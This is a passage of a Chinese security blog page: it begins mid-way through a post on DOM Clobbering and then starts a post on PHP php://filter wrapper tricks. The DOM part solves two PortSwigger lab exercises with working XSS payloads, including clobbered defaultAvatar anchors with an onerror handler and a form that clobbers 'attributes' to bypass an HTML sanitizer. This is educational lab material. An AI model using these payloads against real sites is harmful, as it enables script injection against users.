charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;m1sn0w&quot; &gt;</span><br><span class="line">        &lt;input id=&quot;a&quot;  /&gt;</span><br><span class="line">        &lt;button name=&quot;b&quot;&gt;</span><br><span class="line">        &lt;a id=&quot;c&quot; &gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    console.log(m1sn0w.b)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>​    这里可以输出<code>m1sn0w.a</code>和<code>m1sn0w.b</code>，但是<code>m1sn0w.c</code>输出是<code>undefined</code>，这也就存在一个小问题，就是不能通过<code>form</code>标签来获取<code>a</code>标签所对应的对象，也就会导致最后在进行<code>toString</code>方法调用的时候，其值我们不能进行控制。</p>
<p>​    但是如果前端代码是这样的<code>m1sn0w.a.name</code>或者<code>m1sn0w.a.value</code>这种调用的话，也仍然可以构造<code>HTML</code>标签，让其值为一个字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=&quot;m1sn0w&quot; &gt;</span><br><span class="line">	&lt;input id=&quot;a&quot; name=&quot;d&quot; value=&quot;value&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>​    以上会分别输出字符串<code>d</code>和字符串<code>value</code>值。</p>
<p>​    可能在实际的场景下，<code>username</code>和<code>password</code>这两个变量值更常见，可以利用<code>URL</code>的格式来进行变量的覆盖，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;m1sn0w&quot; href=&quot;http://username:password@127.0.0.1&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>​    这时，如果我访问<code>m1sn0w.username</code>，会直接返回上面的<code>username</code>字符串；同理，访问<code>m1sn0w.passsord</code>也一样。除此之外，利用<code>ftp</code>协议，也可以达到同样的目的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;m1sn0w&quot; href=&quot;ftp:username:password@127.0.0.1&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="利用HTMLCollection"><a href="#利用HTMLCollection" class="headerlink" title="利用HTMLCollection"></a>利用<code>HTMLCollection</code></h4><p>​    当存在多个<code>id</code>相同值的时候，会打印出<code>HTMLCollection</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a id=&quot;m1sn0w&quot;&gt;&lt;/a&gt;</span><br><span class="line">    &lt;a id=&quot;m1sn0w&quot;&gt;&lt;/a&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    console.log(m1sn0w)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>​    以上这种情况，会输出<code>HTMLCollection</code>。（但是在<code>firefox</code>浏览器下，该值返回的是第一个<code>a</code>标签，也就是说，这种利用是有一定的条件的，根据浏览器的不同，可能返回的结果也有不同）</p>
<p>​    如何通过<code>HTMLCollection</code>，来覆盖多层级条件下的变量值。在官方文档<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=oJ1D9O7zC0G75p5HJAHdwg==.T4rCz1iHvWimdD5Z91o+czTLNUDdOaR605ps3xoNK1qejunOuBk3USCf14JgL4OBGSqABLjZ4Up+FDJKTShbFg==">4.2.10.2. Interface HTMLCollection</a>中指出，可以利用层级元素中的<code>id</code>或者<code>name</code>属性来确定调用哪个<code>Collection</code>，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a id=&quot;m1sn0w&quot; name=&quot;one&quot;&gt;&lt;/a&gt;</span><br><span class="line">    &lt;a id=&quot;m1sn0w&quot; name=&quot;two&quot;&gt;&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>​    如果我想要指定返回的是第二个<code>a</code>标签，我可以这样进行调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(m1sn0w.two);</span><br></pre></td></tr></table></figure>

<p>​    也就是说，可以构造相同<code>id</code>属性值的<code>HTML</code>标签，然后指定确定的<code>name</code>属性，就可以指定想要调用的那个标签。</p>
<p>​    利用<code>HTML</code>层级标签加上<code>HTMLCollection</code>，可以实现更多层的变量覆盖，例如，想要覆盖<code>m1sn0w.username.name.value</code>，那么可以如下进行构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;m1sn0w&quot;&gt;&lt;/form&gt;</span><br><span class="line">    &lt;form id=&quot;m1sn0w&quot; name=&quot;username&quot;&gt;</span><br><span class="line">        &lt;input id=&quot;name&quot; value=&quot;m1sn0w&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    console.log(m1sn0w.username.name.value)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213131921607.png" alt="image-20211213131921607"></p>
<h4 id="利用iframe标签"><a href="#利用iframe标签" class="headerlink" title="利用iframe标签"></a>利用<code>iframe</code>标签</h4><p>​    如果想要覆盖掉更多层级的变量，可以使用<code>iframe</code>标签。比如前面已经实现了4级变量的覆盖，如果现在需要覆盖5层变量，即<code>totle.m1sn0w.username.name.value</code>，可以使用如下方式：（当给一个<code>iframe</code>标签指定了<code>name</code>属性之后，就可以利用这个<code>name</code>属性，指向<code>iframe</code>里面的<code>window</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe name=&quot;totle&quot; srcdoc=&#x27;&lt;form id=&quot;m1sn0w&quot;&gt;&lt;/form&gt;</span><br><span class="line">    &lt;form id=&quot;m1sn0w&quot; name=&quot;username&quot;&gt;</span><br><span class="line">        &lt;input id=&quot;name&quot; value=&quot;m1sn0w&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;&#x27;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      console.log(totle.m1sn0w.username.name.value) </span><br><span class="line">    &#125;, 500)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    由于<code>iframe</code>标签不是同步加载的，因此要设置<code>setTimeout</code>才能获取到值，那么有没有什么方法可以不适用<code>setTimeout</code>就可以直接获取值呢？这里解决的思路就是有没有一种方式，可以产生一个短暂的延时，等待<code>iframe</code>标签加载完，因此可以利用导入样式表，导致其有一小段时间的延迟：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe name=&quot;totle&quot; srcdoc=&#x27;&lt;form id=&quot;m1sn0w&quot;&gt;&lt;/form&gt;</span><br><span class="line">    &lt;form id=&quot;m1sn0w&quot; name=&quot;username&quot;&gt;</span><br><span class="line">        &lt;input id=&quot;name&quot; value=&quot;m1sn0w&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;&#x27;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;style&gt;@import &#x27;//m1sn0w.top&#x27;;&lt;/style&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">      console.log(totle.m1sn0w.username.name.value) </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    这样，就不需要利用<code>setTimeout</code>来等待<code>iframe</code>标签加载完毕，而可以直接获取元素属性值了。</p>
<p>​    如果想要实现更多层级的变量覆盖，可以尝试在<code>iframe</code>标签中的<code>srcdoc</code>中嵌套<code>iframe</code>标签。</p>
<h2 id="PortSwigger-lab实践"><a href="#PortSwigger-lab实践" class="headerlink" title="PortSwigger lab实践"></a><code>PortSwigger lab</code>实践</h2><p>​    在<code>PortSwigger</code>中提供了两个实验，可以通过实践的方式，加深对<code>DOM Clobbering</code>的理解：</p>
<h3 id="Exploiting-DOM-clobbering-to-enable-XSS"><a href="#Exploiting-DOM-clobbering-to-enable-XSS" class="headerlink" title="Exploiting DOM clobbering to enable XSS"></a>Exploiting DOM clobbering to enable XSS</h3><p>​    这个实验有一个留言板，将用户输入的内容，最后以<code>HTML</code>的方式，呈现在前端界面，查看一下关键的<code>js</code>代码，简单分析一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"># js代码</span><br><span class="line">function loadComments(postCommentPath) &#123;</span><br><span class="line">    let xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.onreadystatechange = function() &#123;</span><br><span class="line">        if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span><br><span class="line">            let comments = JSON.parse(this.responseText);</span><br><span class="line">            displayComments(comments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.open(&quot;GET&quot;, postCommentPath + window.location.search);</span><br><span class="line">    xhr.send();</span><br><span class="line"></span><br><span class="line">    function escapeHTML(data) &#123;</span><br><span class="line">        return data.replace(/[&lt;&gt;&#x27;&quot;]/g, function(c)&#123;</span><br><span class="line">            return &#x27;&amp;#&#x27; + c.charCodeAt(0) + &#x27;;&#x27;;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function displayComments(comments) &#123;</span><br><span class="line">        let userComments = document.getElementById(&quot;user-comments&quot;);</span><br><span class="line"></span><br><span class="line">        for (let i = 0; i &lt; comments.length; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            comment = comments[i];</span><br><span class="line">            let commentSection = document.createElement(&quot;section&quot;);</span><br><span class="line">            commentSection.setAttribute(&quot;class&quot;, &quot;comment&quot;);</span><br><span class="line"></span><br><span class="line">            let firstPElement = document.createElement(&quot;p&quot;);</span><br><span class="line"></span><br><span class="line">            let defaultAvatar = window.defaultAvatar || &#123;avatar: &#x27;/resources/images/avatarDefault.svg&#x27;&#125;</span><br><span class="line">            let avatarImgHTML = &#x27;&lt;img class=&quot;avatar&quot; src=&quot;&#x27; + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + &#x27;&quot;&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">            let divImgContainer = document.createElement(&quot;div&quot;);</span><br><span class="line">            divImgContainer.innerHTML = avatarImgHTML</span><br><span class="line"></span><br><span class="line">            if (comment.author) &#123;</span><br><span class="line">                if (comment.website) &#123;</span><br><span class="line">                    let websiteElement = document.createElement(&quot;a&quot;);</span><br><span class="line">                    websiteElement.setAttribute(&quot;id&quot;, &quot;author&quot;);</span><br><span class="line">                    websiteElement.setAttribute(&quot;href&quot;, comment.website);</span><br><span class="line">                    firstPElement.appendChild(websiteElement)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                let newInnerHtml = firstPElement.innerHTML + DOMPurify.sanitize(comment.author)</span><br><span class="line">                firstPElement.innerHTML = newInnerHtml</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (comment.date) &#123;</span><br><span class="line">                let dateObj = new Date(comment.date)</span><br><span class="line">                let month = &#x27;&#x27; + (dateObj.getMonth() + 1);</span><br><span class="line">                let day = &#x27;&#x27; + dateObj.getDate();</span><br><span class="line">                let year = dateObj.getFullYear();</span><br><span class="line"></span><br><span class="line">                if (month.length &lt; 2)</span><br><span class="line">                    month = &#x27;0&#x27; + month;</span><br><span class="line">                if (day.length &lt; 2)</span><br><span class="line">                    day = &#x27;0&#x27; + day;</span><br><span class="line"></span><br><span class="line">                dateStr = [day, month, year].join(&#x27;-&#x27;);</span><br><span class="line"></span><br><span class="line">                let newInnerHtml = firstPElement.innerHTML + &quot; | &quot; + dateStr</span><br><span class="line">                firstPElement.innerHTML = newInnerHtml</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            firstPElement.appendChild(divImgContainer);</span><br><span class="line"></span><br><span class="line">            commentSection.appendChild(firstPElement);</span><br><span class="line"></span><br><span class="line">            if (comment.body) &#123;</span><br><span class="line">                let commentBodyPElement = document.createElement(&quot;p&quot;);</span><br><span class="line">                commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);</span><br><span class="line"></span><br><span class="line">                commentSection.appendChild(commentBodyPElement);</span><br><span class="line">            &#125;</span><br><span class="line">            commentSection.appendChild(document.createElement(&quot;p&quot;));</span><br><span class="line"></span><br><span class="line">            userComments.appendChild(commentSection);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    当完成留言以后，访问相应留言界面，就会触发这个函数：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213144438507.png" alt="image-20211213144438507"></p>
<p>​    也就是说，这里将整个页面的<code>HTML</code>都传入了<code>displayComments</code>这个函数。在<code>displayComments</code>这个函数中，它获取了所有<code>id</code>为<code>user-comments</code>的元素，然后在每个元素下面，生成了一些特点标签。</p>
<p>​    <code>DOM Clobbering</code>不能覆盖掉已有的变量。在<code>displayComments</code>函数中，可以看到<code>window.defaultAvatar</code>这个变量，我们主要对该变量进行一个覆盖，从而控制<code>JS</code>中的<code>defaultAvatar</code>变量，达到<code>XSS</code>的目的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let defaultAvatar = window.defaultAvatar || &#123;avatar: &#x27;/resources/images/avatarDefault.svg&#x27;&#125;</span><br><span class="line"></span><br><span class="line">let avatarImgHTML = &#x27;&lt;img class=&quot;avatar&quot; src=&quot;&#x27; + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + &#x27;&quot;&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p>​    以上就是存在漏洞点的两行代码，第二行代码进行了一个字符串拼接的操作。因此，这里的利用思路就是，首先设置<code>window.defaultAvatar</code>值，然后还需要指定<code>avatar</code>值，构造payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=defaultAvatar&gt;</span><br><span class="line">&lt;a id=defaultAvatar name=avatar href=&quot;1&amp;quot; onerror=alert(1)//&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>​    最后拼接完成以后的字符串即为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;1&quot; onerror=alert(1)//&quot; name=&quot;avatar&quot; id=&quot;defaultAvatar&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Clobbering-DOM-attributes-to-bypass-HTML-filters"><a href="#Clobbering-DOM-attributes-to-bypass-HTML-filters" class="headerlink" title="Clobbering DOM attributes to bypass HTML filters"></a>Clobbering DOM attributes to bypass HTML filters</h3><p>​    在<code>resources/js/htmlJanitor.js</code>中，有如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for (var a = 0; a &lt; node.attributes.length; a += 1) &#123;</span><br><span class="line">    var attr = node.attributes[a];</span><br><span class="line"></span><br><span class="line">    if (shouldRejectAttr(attr, allowedAttrs, node)) &#123;</span><br><span class="line">      node.removeAttribute(attr.name);</span><br><span class="line">      // Shift the array to continue looping.</span><br><span class="line">      a = a - 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    这里通过一个<code>for</code>循环，除去一些黑名单中的属性元素。从整个代码来看，<code>node</code>属性值是可以控制的，也就是说，传入的数据值，可以通过覆盖掉<code>attributes</code>值，从而绕过这个<code>for</code>循环，达到了<code>bypass</code>的目的。</p>
<p>​    例如传入一下<code>payload</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=m1sn0w tabindex=0 onfocus=alert(1)&gt;&lt;input id=attributes&gt;</span><br></pre></td></tr></table></figure>

<p>然后访问：<code>https://ac601fff1e547796c0224f7300ed00be.web-security-academy.net/post?postId=7#m1sn0w</code>即可触发弹窗。（利用<code>tabindex</code>和<code>onfocus</code>属性，可以使用锚点的方式进行触发）。根据实验的要求，需要调用<code>print()</code>函数，因此构造以下<code>payload</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=m1sn0w tabindex=0 onfocus=print()&gt;&lt;input id=attributes&gt;</span><br></pre></td></tr></table></figure>

<p>​    最终在<code>exploit</code>中提交<code>iframe</code>标签进行漏洞的利用，即可完成实验：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=https://ac601fff1e547796c0224f7300ed00be.web-security-academy.net/post?postId=8 onload=&quot;setTimeout(()=&gt;this.src=this.src+&#x27;#m1sn0w&#x27;,500)&quot;&gt;</span><br></pre></td></tr></table></figure>



<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>​    相比于传统的<code>XSS</code>漏洞，<code>DOM Clobbering</code>更加巧妙。其利用<code>HTML</code>标签元素去影响<code>JS</code>中的变量，从而达到一些绕过安全策略的限制。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>【DOM Clobbering 的原理及应用】<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000040098609">https://segmentfault.com/a/1190000040098609</a></p>
<p>【DOM Clobbering strikes back】<a target="_blank" rel="noopener" href="https://portswigger.net/research/dom-clobbering-strikes-back">https://portswigger.net/research/dom-clobbering-strikes-back</a></p>
<p>【DOM破坏攻击学习】<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1664107945038899101&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1664107945038899101&amp;wfr=spider&amp;for=pc</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/" data-id="cl8h2kvx4000dhqdphzs9bjq3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-PHP Filter伪协议Trick总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/15/PHP%20Filter%E4%BC%AA%E5%8D%8F%E8%AE%AETrick%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2021-12-15T08:48:20.000Z" itemprop="datePublished">2021-12-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/15/PHP%20Filter%E4%BC%AA%E5%8D%8F%E8%AE%AETrick%E6%80%BB%E7%BB%93/">PHP Filter伪协议Trick</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="PHP-Filter伪协议Trick总结"><a href="#PHP-Filter伪协议Trick总结" class="headerlink" title="PHP Filter伪协议Trick总结"></a><code>PHP Filter</code>伪协议<code>Trick</code>总结</h1><p>前言：最近在学习的过程中碰到了很多的<code>filter</code>协议的小<code>trick</code>，在此做一个总结以及对<code>filter</code>协议的一些探索。</p>
<h2 id="PHP-Filter协议介绍"><a href="#PHP-Filter协议介绍" class="headerlink" title="PHP Filter协议介绍"></a><code>PHP Filter</code>协议介绍</h2><p>​    <code>php://filter</code>是<code>php</code>中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如<code>base64</code>编码处理，<code>rot13</code>处理等。官方解释为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 </span><br></pre></td></tr></table></figure>

<h2 id="Filter协议的使用方法"><a href="#Filter协议的使用方法" class="headerlink" title="Filter协议的使用方法"></a><code>Filter</code>协议的使用方法</h2><p><code>Filter</code>协议的一般语法为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/过滤器|过滤器/resource=待过滤的数据流</span><br></pre></td></tr></table></figure>

<p>其中过滤器可以设置多个，按照链式的方式依次对数据进行过滤处理。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo file_get_contents(&quot;php://filter/read=convert.base64-encode|convert.base64-encode/resource=data://text/plain,&lt;?php phpinfo();?&gt;&quot;);</span><br></pre></td></tr></table></figure>

<p>对<code>&lt;?php phpinfo();?&gt;</code>这个字符串进行了两次<code>base64</code>编码处理。</p>
<p><code>php filter</code>的过滤器有很多种，根据官方文档（<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php%EF%BC%89%EF%BC%8C%E5%A4%A7%E8%87%B4%E5%8F%AF%E4%BB%A5%E5%88%86%E4%B8%BA%E5%9B%9B%E7%B1%BB%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4%E5%99%A8%E3%80%81%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8%E3%80%81%E5%8E%8B%E7%BC%A9%E8%BF%87%E6%BB%A4%E5%99%A8%E3%80%81%E5%8A%A0%E5%AF%86%E8%BF%87%E6%BB%A4%E5%99%A8">https://www.php.net/manual/zh/filters.php），大致可以分为四类：字符串过滤器、转换过滤器、压缩过滤器、加密过滤器</a></p>
<h3 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h3><p>以<code>string</code>字符串开头，常见的过滤器有<code>rot13</code>、<code>toupper</code>、<code>tolower</code>、<code>strip_tags</code>等，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># string.rot13即对数据流进行str_rot13函数处理</span><br><span class="line">echo file_get_contents(&quot;php://filter/read=string.rot13/resource=data://text/plain,abcdefg&quot;);</span><br><span class="line"># 输出结果为nopqrst</span><br></pre></td></tr></table></figure>

<p><code>toupper、tolower</code>是对字符串进行大小写转换处理：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&quot;php://filter/read=string.toupper/resource=data://text/plain,abcdefg&quot;);</span><br></pre></td></tr></table></figure>

<p><code>strip_tags</code>对数据流进行<code>strip_tags</code>函数的处理，该函数功能为剥去字符串中的 <code>HTML</code>、<code>XML</code> 以及 <code>PHP</code> 的标签，简单理解就是包含有尖括号中的东西。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&quot;php://filter/read=string.strip_tags/resource=data://text/plain,&lt;a&gt;s&lt;/a&gt;&quot;);</span><br><span class="line"># 结果返回s</span><br></pre></td></tr></table></figure>

<h3 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h3><p>主要含有三类，分别是<code>base64</code>的编码转换、<code>quoted-printable</code>的编码转换以及<code>iconv</code>字符编码的转换。该类过滤器以<code>convert</code>开头。</p>
<p><code>base64</code>的编码转换操作，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&quot;php://filter/read=convert.base64-encode/resource=data://text/plain,m1sn0w&quot;);</span><br></pre></td></tr></table></figure>

<p><code>Quoted-printable</code>可译为<strong>可打印字符引用编码</strong>，可以理解为将一些不可打印的<code>ASCII</code>字符进行一个编码转换，转换成<code>=</code>后面跟两个十六进制数，例如：</p>
